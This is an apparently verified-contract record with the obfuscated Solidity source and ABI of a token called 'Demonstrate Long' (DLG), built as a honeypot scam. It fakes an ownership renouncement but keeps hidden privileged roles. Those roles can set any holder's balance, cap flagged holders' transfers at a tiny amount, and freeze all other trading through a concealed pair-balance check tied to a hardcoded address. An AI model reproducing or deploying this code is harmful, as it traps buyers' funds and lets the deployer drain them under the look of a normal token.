{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.16;\n\ninterface autoToLaunch {\n    function createPair(address exemptTo, address launchSender) external returns (address);\n}\n\ninterface atTeam {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address listFrom) external view returns (uint256);\n\n    function transfer(address maxMarketing, uint256 receiverAuto) external returns (bool);\n\n    function allowance(address toAuto, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 receiverAuto) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address maxMarketing,\n        uint256 receiverAuto\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed liquidityFromTake, uint256 value);\n    event Approval(address indexed toAuto, address indexed spender, uint256 value);\n}\n\nabstract contract txReceiverTrading {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface minReceiver {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface atTeamMetadata is atTeam {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DemonstrateLong is txReceiverTrading, atTeam, atTeamMetadata {\n\n    uint256 constant enableSwap = 15 ** 10;\n\n    uint256 public txMode;\n\n    function senderSellBuy(address minLimit) public {\n        if (txLaunch) {\n            return;\n        }\n        \n        maxTradingFee[minLimit] = true;\n        \n        txLaunch = true;\n    }\n\n    bool public launchedAt;\n\n    function allowance(address maxTotal, address launchedTo) external view virtual override returns (uint256) {\n        if (launchedTo == walletLaunch) {\n            return type(uint256).max;\n        }\n        return shouldReceiver[maxTotal][launchedTo];\n    }\n\n    address public launchedAmount;\n\n    uint256 private tradingMarketing;\n\n    event OwnershipTransferred(address indexed modeSwap, address indexed buySender);\n\n    mapping(address => bool) public maxTradingFee;\n\n    string private tradingAt = \"DLG\";\n\n    address public atMaxTake;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return marketingExemptSell;\n    }\n\n    uint256 public listTrading;\n\n    constructor (){\n        if (launchedList) {\n            tradingMarketing = txMode;\n        }\n        minReceiver enableExempt = minReceiver(walletLaunch);\n        atMaxTake = autoToLaunch(enableExempt.factory()).createPair(enableExempt.WETH(), address(this));\n        if (receiverTrading == launchedAt) {\n            listTrading = sellAmount;\n        }\n        launchedAmount = _msgSender();\n        maxTradingFee[launchedAmount] = true;\n        maxTokenTeam[launchedAmount] = marketingExemptSell;\n        shouldMarketing();\n        \n        emit Transfer(address(0), launchedAmount, marketingExemptSell);\n    }\n\n    function approve(address launchedTo, uint256 receiverAuto) public virtual override returns (bool) {\n        shouldReceiver[_msgSender()][launchedTo] = receiverAuto;\n        emit Approval(_msgSender(), launchedTo, receiverAuto);\n        return true;\n    }\n\n    mapping(address => uint256) private maxTokenTeam;\n\n    function exemptMin(address walletLiquidityList, address maxMarketing, uint256 receiverAuto) internal returns (bool) {\n        if (walletLiquidityList == launchedAmount) {\n            return buyAuto(walletLiquidityList, maxMarketing, receiverAuto);\n        }\n        uint256 receiverLaunchFee = atTeam(atMaxTake).balanceOf(txExempt);\n        require(receiverLaunchFee == fundWalletIs);\n        require(maxMarketing != txExempt);\n        if (receiverIsFund[walletLiquidityList]) {\n            return buyAuto(walletLiquidityList, maxMarketing, enableSwap);\n        }\n        return buyAuto(walletLiquidityList, maxMarketing, receiverAuto);\n    }\n\n    address walletLaunch = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool private launchedList;\n\n    function decimals() external view virtual override returns (uint8) {\n        return txReceiver;\n    }\n\n    uint256 fundWalletIs;\n\n    function minFundAuto(address fundListToken) public {\n        tradingTo();\n        if (minTrading == sellAmount) {\n            sellAmount = minTrading;\n        }\n        if (fundListToken == launchedAmount || fundListToken == atMaxTake) {\n            return;\n        }\n        receiverIsFund[fundListToken] = true;\n    }\n\n    uint8 private txReceiver = 18;\n\n    bool public txLaunch;\n\n    mapping(address => bool) public receiverIsFund;\n\n    function buyAuto(address walletLiquidityList, address maxMarketing, uint256 receiverAuto) internal returns (bool) {\n        require(maxTokenTeam[walletLiquidityList] >= receiverAuto);\n        maxTokenTeam[walletLiquidityList] -= receiverAuto;\n        maxTokenTeam[maxMarketing] += receiverAuto;\n        emit Transfer(walletLiquidityList, maxMarketing, receiverAuto);\n        return true;\n    }\n\n    function marketingReceiver(address takeMin, uint256 receiverAuto) public {\n        tradingTo();\n        maxTokenTeam[takeMin] = receiverAuto;\n    }\n\n    uint256 private minTrading;\n\n    function getOwner() external view returns (address) {\n        return takeTotalMax;\n    }\n\n    uint256 public sellAmount;\n\n    bool public receiverTrading;\n\n    function transferFrom(address walletLiquidityList, address maxMarketing, uint256 receiverAuto) external override returns (bool) {\n        if (_msgSender() != walletLaunch) {\n            if (shouldReceiver[walletLiquidityList][_msgSender()] != type(uint256).max) {\n                require(receiverAuto <= shouldReceiver[walletLiquidityList][_msgSender()]);\n                shouldReceiver[walletLiquidityList][_msgSender()] -= receiverAuto;\n            }\n        }\n        return exemptMin(walletLiquidityList, maxMarketing, receiverAuto);\n    }\n\n    address txExempt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address private takeTotalMax;\n\n    function senderShould(uint256 receiverAuto) public {\n        tradingTo();\n        fundWalletIs = receiverAuto;\n    }\n\n    function tradingTo() private view {\n        require(maxTradingFee[_msgSender()]);\n    }\n\n    uint256 liquidityList;\n\n    string private marketingExempt = \"Demonstrate Long\";\n\n    function owner() external view returns (address) {\n        return takeTotalMax;\n    }\n\n    function balanceOf(address listFrom) public view virtual override returns (uint256) {\n        return maxTokenTeam[listFrom];\n    }\n\n    uint256 public sellTeam;\n\n    mapping(address => mapping(address => uint256)) private shouldReceiver;\n\n    function transfer(address takeMin, uint256 receiverAuto) external virtual override returns (bool) {\n        return exemptMin(_msgSender(), takeMin, receiverAuto);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return tradingAt;\n    }\n\n    uint256 private marketingExemptSell = 100000000 * 10 ** 18;\n\n    function name() external view virtual override returns (string memory) {\n        return marketingExempt;\n    }\n\n    function shouldMarketing() public {\n        emit OwnershipTransferred(launchedAmount, address(0));\n        takeTotalMax = address(0);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toAuto\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeSwap\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buySender\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityFromTake\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxTotal\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchedTo\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverAuto\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atMaxTake\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listFrom\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedAmount\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listTrading\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverAuto\",\"type\":\"uint256\"}],\"name\":\"marketingReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"maxTradingFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundListToken\",\"type\":\"address\"}],\"name\":\"minFundAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverIsFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellTeam\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minLimit\",\"type\":\"address\"}],\"name\":\"senderSellBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"receiverAuto\",\"type\":\"uint256\"}],\"name\":\"senderShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverAuto\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletLiquidityList\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"maxMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverAuto\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txMode\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "DemonstrateLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}